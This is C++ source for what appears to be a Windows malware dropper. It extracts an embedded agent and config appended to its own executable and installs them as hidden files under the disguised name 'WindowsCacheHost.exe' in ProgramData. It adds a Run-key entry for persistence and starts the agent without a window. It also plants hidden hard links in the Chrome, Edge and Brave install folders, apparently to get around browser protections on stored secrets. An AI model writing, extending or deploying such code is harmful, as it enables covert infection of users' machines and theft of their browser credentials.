#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <fstream>
#include <cstdint>
#include <cstring>
#include <iterator>

#pragma pack(push, 1)
struct Footer {
    char magic[8];
    uint64_t originalOffset;
    uint64_t originalLength;
    uint64_t agentOffset;
    uint64_t agentLength;
    uint64_t arm64AgentOffset;
    uint64_t arm64AgentLength;
    uint64_t configOffset;
    uint64_t configLength;
    wchar_t originalName[260];
};
#pragma pack(pop)

static std::wstring g_agentArch = L"x64";

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

static std::wstring ModuleDir() {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    PathRemoveFileSpecW(path);
    return path;
}

static std::wstring Join(const std::wstring& a, const std::wstring& b) {
    wchar_t out[MAX_PATH]{};
    wcscpy_s(out, a.c_str());
    PathAppendW(out, b.c_str());
    return out;
}

static std::string ToUtf8(const std::wstring& value) {
    if (value.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), (int)value.size(), nullptr, 0, nullptr, nullptr);
    if (size <= 0) return {};
    std::string out((size_t)size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value.c_str(), (int)value.size(), out.data(), size, nullptr, nullptr);
    return out;
}

static void LogSetup(const std::wstring& directory, const std::wstring& message) {
    std::string line = ToUtf8(message) + "\r\n";
    std::ofstream out(directory + L"\\setup.log", std::ios::binary | std::ios::app);
    if (!out.good()) return;
    out.write(line.data(), (std::streamsize)line.size());
}

static bool Copy(const std::wstring& from, const std::wstring& to) {
    return CopyFileW(from.c_str(), to.c_str(), FALSE) != FALSE;
}

static bool ReadSelf(std::vector<uint8_t>& data) {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::ifstream in(path, std::ios::binary);
    if (!in.good()) return false;
    data.assign(std::istreambuf_iterator<char>(in), std::istreambuf_iterator<char>());
    return true;
}

static bool WriteBytes(const std::wstring& path, const std::vector<uint8_t>& data) {
    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    if (!out.good()) return false;
    out.write(reinterpret_cast<const char*>(data.data()), (std::streamsize)data.size());
    return out.good();
}

static bool ExtractBundled(std::wstring& agentPath, std::wstring& configPath) {
    std::vector<uint8_t> file;
    if (!ReadSelf(file) || file.size() < sizeof(Footer)) return false;
    Footer footer{};
    std::memcpy(&footer, file.data() + file.size() - sizeof(Footer), sizeof(Footer));
    bool hasArm64 = std::memcmp(footer.magic, "KLINF2\0", 7) == 0;
    if (!hasArm64 && std::memcmp(footer.magic, "KLINF1\0", 7) != 0) return false;
    if (footer.originalOffset + footer.originalLength > file.size() ||
        footer.agentOffset + footer.agentLength > file.size() ||
        footer.configOffset + footer.configLength > file.size()) return false;
    if (hasArm64 && footer.arm64AgentOffset + footer.arm64AgentLength > file.size()) return false;

    SYSTEM_INFO systemInfo{};
    GetNativeSystemInfo(&systemInfo);
    bool isArm64 = systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64;
    uint64_t agentOffset = footer.agentOffset;
    uint64_t agentLength = footer.agentLength;
    if (isArm64 && hasArm64 && footer.arm64AgentLength > 0) {
        agentOffset = footer.arm64AgentOffset;
        agentLength = footer.arm64AgentLength;
        g_agentArch = L"arm64";
    } else if (isArm64) {
        g_agentArch = L"x64-emulated";
    }

    std::vector<uint8_t> agent(file.begin() + agentOffset, file.begin() + agentOffset + agentLength);
    std::vector<uint8_t> config(file.begin() + footer.configOffset, file.begin() + footer.configOffset + footer.configLength);
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring dir = std::wstring(temp) + L"kl_setup_" + std::to_wstring(GetCurrentProcessId());
    CreateDirectoryW(dir.c_str(), nullptr);
    agentPath = Join(dir, L"WindowsCacheHost.exe");
    configPath = Join(dir, L"klive.config.json");
    return WriteBytes(agentPath, agent) && WriteBytes(configPath, config);
}

static int RunHidden(const std::wstring& exe, const std::wstring& args, DWORD timeoutMs) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring command = L"\"" + exe + L"\" " + args;
    if (!CreateProcessW(nullptr, command.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return -1;
    DWORD wait = WaitForSingleObject(pi.hProcess, timeoutMs);
    DWORD code = (DWORD)-1;
    if (wait == WAIT_OBJECT_0) GetExitCodeProcess(pi.hProcess, &code);
    else TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)code;
}

static bool CreateLogonTask(const std::wstring& exe, const std::wstring& logDirectory) {
    HKEY key = nullptr;
    LONG opened = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, nullptr, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, nullptr, &key, nullptr);
    if (opened != ERROR_SUCCESS) {
        LogSetup(logDirectory, L"run_key_open failed error=" + std::to_wstring(opened));
        return false;
    }
    std::wstring value = L"\"" + exe + L"\" --installed";
    LONG result = RegSetValueExW(key, L"WindowsCacheHost", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()), (DWORD)((value.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
    LogSetup(logDirectory, L"run_key_set " + std::to_wstring(result));
    if (result != ERROR_SUCCESS) return false;

    wchar_t readBack[1024]{};
    DWORD size = sizeof(readBack);
    DWORD type = 0;
    LONG read = RegGetValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"WindowsCacheHost", RRF_RT_REG_SZ, &type, readBack, &size);
    LogSetup(logDirectory, L"run_key_read " + std::to_wstring(read));
    return read == ERROR_SUCCESS;
}

static bool StartAgent(const std::wstring& exe, const std::wstring& workingDir) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring command = L"\"" + exe + L"\" --installed";
    bool ok = CreateProcessW(nullptr, command.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
        nullptr, workingDir.c_str(), &si, &pi) != FALSE;
    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok;
}

static void CreateAbeLinks(const std::wstring& agent, const std::wstring& logDirectory) {
    wchar_t programFiles[MAX_PATH]{};
    wchar_t programFiles86[MAX_PATH]{};
    wchar_t localAppData[MAX_PATH]{};
    GetEnvironmentVariableW(L"ProgramFiles", programFiles, MAX_PATH);
    GetEnvironmentVariableW(L"ProgramFiles(x86)", programFiles86, MAX_PATH);
    GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH);
    std::vector<std::wstring> dirs = {
        Join(programFiles86, L"Microsoft\\Edge\\Application"),
        Join(localAppData, L"Microsoft\\Edge\\Application"),
        Join(programFiles, L"Google\\Chrome\\Application"),
        Join(programFiles86, L"Google\\Chrome\\Application"),
        Join(localAppData, L"Google\\Chrome\\Application"),
        Join(programFiles, L"BraveSoftware\\Brave-Browser\\Application"),
        Join(programFiles86, L"BraveSoftware\\Brave-Browser\\Application"),
        Join(localAppData, L"BraveSoftware\\Brave-Browser\\Application"),
    };
    for (const std::wstring& dir : dirs) {
        if (!PathFileExistsW(dir.c_str())) continue;
        std::wstring link = Join(dir, L"WindowsCacheHostAbe.exe");
        SetFileAttributesW(link.c_str(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(link.c_str());
        if (CreateHardLinkW(link.c_str(), agent.c_str(), nullptr)) {
            SetFileAttributesW(link.c_str(), FILE_ATTRIBUTE_HIDDEN);
            LogSetup(logDirectory, L"abe_link ok " + dir);
        } else {
            LogSetup(logDirectory, L"abe_link failed " + dir + L" error=" + std::to_wstring(GetLastError()));
        }
    }
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    std::wstring source = ModuleDir();
    std::wstring agentSource = Join(source, L"WindowsCacheHost.exe");
    std::wstring configSource = Join(source, L"klive.config.json");
    if (!PathFileExistsW(agentSource.c_str()) || !PathFileExistsW(configSource.c_str())) {
        if (!ExtractBundled(agentSource, configSource)) return 1;
    }

    wchar_t programData[MAX_PATH]{};
    if (!GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH))
        return 1;

    std::wstring targetDir = Join(programData, L"WindowsCacheHost");
    CreateDirectoryW(targetDir.c_str(), nullptr);
    std::wstring agentTarget = Join(targetDir, L"WindowsCacheHost.exe");
    std::wstring configTarget = Join(targetDir, L"klive.config.json");

    LogSetup(targetDir, L"setup start agentSource=" + agentSource);
    if (!Copy(agentSource, agentTarget) || !Copy(configSource, configTarget)) {
        LogSetup(targetDir, L"copy failed error=" + std::to_wstring(GetLastError()));
        return 1;
    }
    LogSetup(targetDir, L"copy ok");
    LogSetup(targetDir, L"agent_arch " + g_agentArch);

    SetFileAttributesW(agentTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributesW(configTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);

    CreateLogonTask(agentTarget, targetDir);
    CreateAbeLinks(agentTarget, targetDir);
    bool started = StartAgent(agentTarget, targetDir);
    LogSetup(targetDir, L"start_agent " + std::to_wstring(started ? 1 : 0) + L" error=" + std::to_wstring(started ? 0 : GetLastError()));
    return started ? 0 : 1;
}

